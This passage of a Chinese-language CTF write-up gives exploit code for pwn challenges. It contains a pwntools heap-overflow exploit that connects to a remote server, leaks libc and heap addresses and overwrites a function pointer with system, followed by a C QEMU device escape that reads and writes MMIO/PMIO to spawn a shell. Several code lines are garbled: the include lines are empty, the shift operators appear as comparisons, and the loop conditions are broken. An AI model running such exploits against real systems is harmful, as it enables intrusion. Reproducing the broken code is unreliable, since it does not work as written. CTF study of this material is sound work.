        sh.recvuntil('with this key\n')
        endkey_enc = sh.recvuntil("\n")[:-1].decode().replace(" ","").split(",")
        try:
            endkey = mitm(int(endkey_enc[1]))
            key = userdata + long_to_bytes(endkey)
            msg = b'I am Alice, Please give me true flag'
            aes = AES.new(key, AES.MODE_ECB)
            sh.sendline(aes.encrypt(pad(msg)))
            flag = sh.recvuntil("\n")[:-1]
            print(unpad(aes.decrypt(flag)))
        except Exception as e:
            print(e)
            pass
## Pwn
###  trust
溢出改meme函数指针。
     cccccccc
     bbbbbbbb
     dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
     ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
    #!/usr/bin/python
    from pwn import *
    #context.log_level='debug'
    def edit(name,content):
        sh.sendlineafter('Choice: ','2')
        sh.sendline(name+' '+content)
    def show_old(name):
        sh.sendlineafter('Choice: ','4')
        sh.sendline(name)
    sh=process('./Truth')
    sh=remote('106.14.216.214',45445)
    #pause()
    xmlfile=open("./filelist.xml","r")
    content=xmlfile.read()
    xmlfile.close()
    sh.sendlineafter('Choice: ','1')
    sh.send(content+"\xff")
    show_old('b')
    sh.recvuntil('Useless')
    libc_base=u64(sh.recv(6).ljust(8,'\x00'))-0x3c4b78
    print(hex(libc_base))
    free_hook=libc_base+0x1EEB28
    one_gadget=libc_base+0xe6c7e
    system=libc_base+0x453a0
    system=libc_base+0xf1207
    edit('d','z'*0x70)
    edit('d','x'*0x180)
    show_old('d')
    sh.recvuntil('z'*0x70)
    heap=u64(sh.recvline()[:-1].ljust(8,'\x00'))-0x11e30
    print(hex(heap))
    edit('b','y'*0x58+p64(0x31)+p64(0x405608)+p64(0x100000001)+p64(heap+0x12b10)+p64(heap+0x12b40)+p64(heap+0x12b50)+p64(0x21)+p64(heap+0x11c30)+p64(heap+0x11c10)+p64(system)+p64(0xa1)+p64(0x4054e0)+p64(0x100000001)+p64(heap+0x11e40))
    edit('b','x'*0x18)
    edit('\x00'*0x80,'b')
    show_old('d')
    #gdb.attach(sh)
    sh.interactive()
###  d3dev
qemu逃逸题，可以任意读写a1数组中的值，只是读写时分别会进行tea解密和加密，密钥可以通过pmio_read拿到。调试发现a1[1212]处存储了rand_r的地址，所以泄露出来加密还原得到libc地址，不过需要读2次，第一次读出低4字节，第2次读出高4字节。写入时也是同样的，先写入低4字节，再写入高4字节。将system地址写入到a1[1212]后，通过pmio_write可以调用，此时写入值为0x6873（sh）就可以拿到shell。
exp:
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include    
    #include 
    unsigned char* mmio_base;
    void mmio_write(int offset,int value)
    {
        *(unsigned int*)(mmio_base+offset)=value;
    }
    unsigned int mmio_read(int offset)
    {
        return *(unsigned int*)(mmio_base+offset);
    }
    void EncryptTEA(unsigned int *firstChunk, unsigned int *secondChunk, unsigned int* key)
    {
        unsigned int y = *firstChunk;
        unsigned int z = *secondChunk;
        unsigned int sum = 0;
        unsigned int delta = 0x9e3779b9;
        do
        {
            sum += delta;
            y += ((z > 5) + key[1]);
            z += ((y > 5) + key[3]);
        }while(sum!=0xC6EF3720);
        *firstChunk = y;
        *secondChunk = z;
    }
    //buffer：输入的待加密数据buffer，在函数中直接对元数据buffer进行加密；size：buffer长度；key是密钥；
    void EncryptBuffer(char* buffer, int size, unsigned int* key)
    {
        char *p = buffer;
        int leftSize = size;
        while (p = sizeof(unsigned int) * 2)
        {
            EncryptTEA((unsigned int *)p, (unsigned int *)(p + sizeof(unsigned int)), key);
            p += sizeof(unsigned int) * 2;
            leftSize -= sizeof(unsigned int) * 2;
        }
    }
    void DecryptTEA(unsigned int *firstChunk, unsigned int *secondChunk, unsigned int* key)
    {
        unsigned int  sum = 0xC6EF3720;
        unsigned int  y = *firstChunk;
        unsigned int  z = *secondChunk;
        unsigned int  delta = 0x9e3779b9;
        do
        {
            z -= (y > 5) + key[3];
            y -= (z > 5) + key[1];
            sum -= delta;
        }while(sum!=0);
        *firstChunk = y;
        *secondChunk = z;
    }
    //buffer：输入的待解密数据buffer，在函数中直接对元数据buffer进行解密；size：buffer长度；key是密钥；
    void DecryptBuffer(char* buffer, int size, unsigned int* key)
    {
        char *p = buffer;
        int leftSize = size;
        while (p = sizeof(unsigned int) * 2)
        {
            DecryptTEA((unsigned int *)p, (unsigned int *)(p + sizeof(unsigned int)), key);
            p += sizeof(unsigned int) * 2;
            leftSize -= sizeof(unsigned int) * 2;
        }
    }
    void decrypt(unsigned long *v, unsigned long *k) {
         unsigned long y=v[0], z=v[1], sum=0xC6EF3720, i; /* set up */
         unsigned long delta=0x61C88647;                  /* a key schedule constant */
         unsigned long a=k[0], b=k[1], c=k[2], d=k[3];    /* cache key */
         do {                            /* basic cycle start */
             z -= ((y>5) + d);
             y -= ((z>5) + b);
             sum += delta;                                /* end cycle */
         }while(sum);
         v[0]=y;
         v[1]=z;
    }
    int main()
    {
        int pmio_base=0xc040,i;
        unsigned long long temp,system_addr,box;
        unsigned int addr[2];
        unsigned int keys[4];
        unsigned char buf[4];
        int fd=open("/sys/devices/pci0000:00/0000:00:03.0/resource0",O_RDWR | O_SYNC);
        printf("%d\n",fd);
        mmio_base=mmap(0,0x1000,PROT_READ | PROT_WRITE, MAP_SHARED,fd,0);
        int key1211,key1210,key1209,key1208;
        iopl(3);
        key1211=inl(pmio_base+24);
        printf("%x\n",key1211);
        key1210=inl(pmio_base+20);
        key1209=inl(pmio_base+16);
        key1208=inl(pmio_base+12);
        keys[0]=key1208;
        keys[1]=key1209;
        keys[2]=key1210;
        keys[3]=key1211;
        outl(0x100,pmio_base+8);
        addr[0]=mmio_read(24);
        addr[1]=mmio_read(24);
        EncryptBuffer(addr,8,keys);
        temp=addr[1];
        temp=(temp>32)&0xffffffff;
        DecryptBuffer(addr,8,keys);
        temp=addr[1];
        temp=(temp>32)&0xffffffff;
        DecryptBuffer(addr,8,keys);
        mmio_write(0,addr[0]);    //"/home/ct"
        mmio_write(0,addr[1]);
        //mmio_write(5*8,22);
        box=0x6c662f6600006761;// f/flag
        addr[1]=box&0xffffffff;
        addr[0]=(box>>32)&0xffffffff;
        DecryptBuffer(addr,8,keys);
        mmio_write(8,addr[0]);
        mmio_write(8,addr[1]);
        //mmio_write(6*8,33);
        //outl(0xff,pmio_base+8);
        //decrypt((unsigned long*)&system_addr,keys);
        //mmio_write(4*8,system_addr); //decrypt(system_addr)
        outl(0x6873,pmio_base+0x1c);//"sh"
        //outl(0x6873,pmio_base+28);
        return 0;
    }
###  d3dev-revenge
做法与上题相同。
## Bonus
###  问卷
Goodgame
###  预热任务1 ，2
Goodgame